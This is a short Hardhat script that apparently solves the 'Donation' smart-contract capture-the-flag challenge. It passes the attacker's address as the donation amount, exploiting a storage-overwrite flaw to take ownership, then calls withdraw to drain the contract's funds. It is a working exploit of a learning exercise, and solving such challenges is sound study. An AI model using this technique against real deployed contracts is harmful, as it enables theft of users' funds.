import { BigNumber } from "ethers";
import { task } from "hardhat/config";

const contractAddress = "0xb78C8028CD2443202f7D9934f8a5DC05BB022e5c";

task("donation", "Solves the 'Donation' challenge", async (_taskArgs, hre) => {
  const [_, attacker] = await hre.ethers.getSigners();

  const factory = await hre.ethers.getContractFactory("DonationChallenge");
  const contract = factory.attach(contractAddress);

  const addressValue = BigNumber.from(await attacker.getAddress());

  const donateTx = await contract
    .connect(attacker)
    .donate(addressValue, { value: addressValue.div(BigNumber.from(`10`).pow(`36`)) });
  await donateTx.wait();

  const withdrawTx = await contract.connect(attacker).withdraw();
  await withdrawTx.wait();
});
